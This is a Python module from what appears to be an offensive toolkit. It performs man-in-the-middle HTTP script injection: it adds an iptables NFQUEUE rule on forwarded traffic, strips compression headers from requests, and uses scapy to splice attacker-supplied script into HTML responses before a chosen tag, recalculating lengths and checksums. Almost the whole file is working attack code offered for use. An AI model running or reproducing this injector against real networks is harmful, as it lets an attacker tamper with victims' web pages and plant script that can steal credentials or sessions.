'''
The code_injector software can be included in html_inject.py and script_inject.py
https://github.com/mpostument/hacking_tools/blob/master/LICENSE
	MIT license

	Copyright (c) 2018 Maksym Postument

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
    
'''


from termcolor import colored, cprint
from module import Module
from servers.dnserver import *
import threading
from printib import * 
import os
from pathlib import Path
import time
import netfilterqueue
from scapy.all import *
import re
import argparse

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Script Inject",
                       "Description": "Script content manipulation to replace a tag by a script plus that tag",
                       "Author": "@luisedev"}

        # -----------name-----default_value--description--required?
        options = { "code": [None, "Script to inject, example: <script> alert('hi') </script>", True],
                    "tag": [None, "Tag to replace with the code: If the tag is </body> it will be replaced with code + </body>", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None


    # This module must be always implemented, it is called by the run option
    def run_module(self):
            
        #Enable iptables rules
        os.system("iptables -I FORWARD -j NFQUEUE")

        code = self.options["code"][0] #code to inject
        tag  = self.options["tag"][0]  #tag to replace

        #Code Snippet inspired by: https://github.com/mpostument/hacking_tools/tree/master/code_injector
        #https://github.com/mpostument/hacking_tools/blob/master/LICENSE
        def change(packet, load):
            packet[Raw].load = load # Changes the load to the new one
            del packet[IP].len      #Calculates the IP length
            del packet[IP].chksum   #Calculates the IP checksum
            del packet[TCP].chksum  #Calculates the TCP checksum
            return packet

        #Code Snippet inspired by: https://github.com/mpostument/hacking_tools/tree/master/code_injector
        #https://github.com/mpostument/hacking_tools/blob/master/LICENSE
        #Callback function that filters the incoming packet and injects a new payload
        def inject_code(packet):
            http_packet = IP(packet.get_payload())
            if http_packet.haslayer(Raw) and http_packet.haslayer(TCP): #Check if raw and tcp layer exists in the packet
               
                if http_packet[TCP].dport == 80:
                    load = (http_packet[Raw].load).decode('utf-8','ignore') #get load from raw layer
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) # delete encoding
                
                if http_packet[TCP].sport == 80:
                    load = (http_packet[Raw].load).decode('utf-8','ignore') #get load from raw layer
                    load = load.replace(tag, code + tag) #replace selected tag
                    length_search = re.search("(?:Content-Length:\s)(\d*)", load) #get length
                    
                    if length_search and "text/html" in load:
                        length = length_search.group(1) #Old length
                        new_length = int(length) + len(code) #Calculating new length
                        load = load.replace(length, str(new_length)) #Replacing load
                        
                if load != http_packet[Raw].load: #load is not the same
                    new_packet = change(http_packet, load) #change payload
                    packet.set_payload(bytes(new_packet)) #set the new payload

            packet.accept()
       
        def myQueue(queue):
            queue.bind(0, inject_code) # bind the queue with the 0 nfqueue and the inject code function
            queue.run() #run the queue

        def nfqBinding():
            try:
                queue = netfilterqueue.NetfilterQueue()
                queueThread = threading.Thread(target=myQueue, args=(queue,)) #thread with the callback method myQueue
                queueThread.start() #Start the thread
                t = threading.currentThread()
                while getattr(t, "do_run", True): #do while the job isn´t dead
                    time.sleep(1)
                queue.unbind()  #unbind queue
                os.system("iptables -D FORWARD -j NFQUEUE")   #Disable iptables rules
            except Exception as e:
                os.system("iptables -D FORWARD -j NFQUEUE")   #Disable iptables rules
                print_error(e)

        thread1 = threading.Thread(target=nfqBinding)
        thread1.start()
       
        super(CustomModule, self).run(t=thread1)
